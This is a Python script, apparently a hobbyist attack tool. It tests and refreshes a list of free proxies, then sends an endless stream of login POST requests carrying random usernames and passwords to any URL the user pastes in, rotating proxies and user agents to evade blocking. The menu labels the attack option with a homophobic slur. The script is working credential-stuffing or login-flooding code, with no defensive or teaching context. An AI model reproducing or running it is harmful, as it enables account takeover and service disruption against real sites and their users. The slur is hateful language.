import requests
import sys
import random
import socket
import socks
import random
from urllib.parse import urlparse
#files
usernames = "usernames.txt"
passwords = "passwords.txt"
useragents = "useragents.txt"
proxies_file = "proxies.txt"
#reading the files
userfile = open(usernames, "r")
passfile = open(passwords, "r")
useragentfile = open(useragents, "r")
proxiesfile = open(proxies_file, "r")
#reading lines
uflines = userfile.readlines()
pflines = passfile.readlines()
uaflines = useragentfile.readlines()
proxlines = proxiesfile.readlines()
#getting started
ic1 = input("Pick an option.\n1) Test Proxies in Proxies.txt!\n2) Update the proxy list with freshies!\n3) Fuck some faggots up!\n")
if ic1 == "1":
    #test machine brrrr
    proxy_list = []
    working_proxies = []
    tested = []
    with open(proxies_file) as txt:
        for prox in txt:
            proxy_list.append(prox.strip("\n"))
    oldcount = str(len(proxy_list))
    for prox in proxy_list:
        proxies = {'https':"http://" + prox}
        r = requests.Session()
        r.proxies = proxies
        remainder = int(len(proxy_list)) - int(len(tested))
        try:
            tested.append(prox)
            sendoff = r.get("https://ident.me", timeout=5)
            print("Successful: " + prox + " (" + str(remainder) + " Remaining)")
            working_proxies.append(prox)
        except:
            print("Unsuccessful: " + prox + " (" + str(remainder) + " Remaining)")
    with open(proxies_file, 'w') as txt:
        for i in working_proxies:
            txt.write(i + "\n")
if ic1 == "2":
    #fetch
    proxy_list = []
    with open(proxies_file) as txt:
        for prox in txt:
            proxy_list.append(prox.strip("\n"))
    oldcount = str(len(proxy_list))
    api_endpoint = "https://api.proxyscrape.com?request=getproxies&proxytype=http&timeout=5000&country=US&anonymity=elite&ssl=yes"
    proxies_dl = requests.get(api_endpoint).content.decode('utf-8')
    for prox in proxies_dl.split("\r\n"):
        proxy_list.append(prox)
    cleanlist = [i for i in proxy_list if i]
    with open(proxies_file, 'w') as txt:
        for i in cleanlist:
            txt.write(i + "\n")
    print("Done! You now have " + str(len(cleanlist)) + " proxies in your list vs your prior " + oldcount + "!")
if ic1 == "3":
    #go time
    ic2 = input("Paste the FULL URL of the login post request.\n")
    ic3 = input("Paste the id of the Username/Email box.")
    ic4 = input("Paste the id of the password box.")
    purl = urlparse(ic2)
    pdomain = purl.hostname

    while True:
        proxyserver = random.choice(proxlines)
        proxies = {'https':"http://" + proxyserver}
        username = random.choice(uflines)
        password = random.choice(pflines)
        useragent = random.choice(uaflines)
        headers = {'User-Agent': useragent.strip("\n"),
        "Host": pdomain,
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "61",
        "Origin": "placeholder",
        "DNT": "0",
        "Connection": "keep-alive",
        "Referer": ic2
        }
        try:
            sendoff = requests.post(ic2, data={ic3: username, ic4: password}, headers=headers, proxies=proxies)
            print(sendoff)
        except:
            print("Failed to send request. Check internet connection and proxies.")
